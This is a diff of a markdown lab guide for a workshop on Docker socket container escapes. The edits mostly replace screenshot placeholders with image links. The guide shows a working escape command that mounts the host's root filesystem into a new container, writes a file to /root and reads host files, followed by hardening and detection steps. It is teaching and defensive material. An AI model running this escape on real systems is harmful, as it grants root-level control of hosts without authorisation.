@@ -12,7 +12,7 @@
 
 ---
 
-## ⚠️ Rules of engagement - read this first
+## [!] Rules of engagement - read this first
 
 - You will attack a **deliberately misconfigured container** - **only on your own
   S617 workshop VM**. The "host" you take over is **your own disposable VM**.
@@ -47,7 +47,7 @@ docker compose up -d
 The one red flag: `- /var/run/docker.sock:/var/run/docker.sock`. That line hands
 the container the keys to the host's Docker daemon.
 
-> 📸 **Screenshot:** _the compose file with the socket-mount line visible._
+> ![the compose file with the socket-mount line visible.](./images/03B1composeFileSock.png)
 
 ---
 
@@ -65,8 +65,7 @@ docker ps          # you can see the HOST's containers - you're driving the
 Seeing the host's containers listed is the "uh-oh" moment: a process inside a
 container is commanding the host's Docker.
 
-> 📸 **Screenshot:** _`docker ps` run inside the agent container, listing host
-> containers._
+> ![`docker ps` run inside the agent container, listing host containers](./images/03B2dockerPsInside.png)
 
 ---
 
@@ -80,6 +79,7 @@ container:
 # Launch a throwaway container, mount the host's / at /host, and use it:
 docker run --rm -v /:/host alpine sh -c \
   'echo PWNED-BY-S617 > /host/root/ESCAPED-SOCKET.txt; cat /host/etc/hostname'
+
 exit    # leave the agent container
 ```
 
@@ -94,7 +94,8 @@ sudo cat /root/ESCAPED-SOCKET.txt
 There it is - a file written to the host's `/root`, created by a container that
 only had one extra thing: the Docker socket. That's the escape.
 
-> 📸 **Screenshot:** _`sudo cat /root/ESCAPED-SOCKET.txt` on the host - proof._
+> ![sudo cat /root/ESCAPED-SOCKET.txt` on the host - proof.](./images/03A3Bmessage.png)
+
 
 **Why it worked (one sentence):** the Docker socket is root-level control of the
 host's daemon, so a container that can reach it can launch another container that
@@ -132,8 +133,8 @@ exit
 The container can no longer see or control the host's Docker. Escape path
 closed.
 
-> 📸 **Screenshot:** _`docker ps` inside the hardened container failing to
-> connect._
+> ![`docker ps` inside the hardened container failing to connect](./images/03B4hardened.png)
+
 
 **If a container genuinely needs the Docker API** (some CI/monitoring tools do),
 never give it the raw socket. Put a **socket proxy** in front (for example
@@ -159,6 +160,8 @@ docker inspect escape-socket-agent-1 \
   --format 'Mounts={{range .Mounts}}{{.Source}}->{{.Destination}} {{end}}'
 docker compose down
 ```
+> ![inespect for mounted socket](./images/03B5inspect.png)
+
 
 (Container name may differ - `docker ps` shows it.) A **Source of
 `/var/run/docker.sock`** on an untrusted container is a finding, every time.
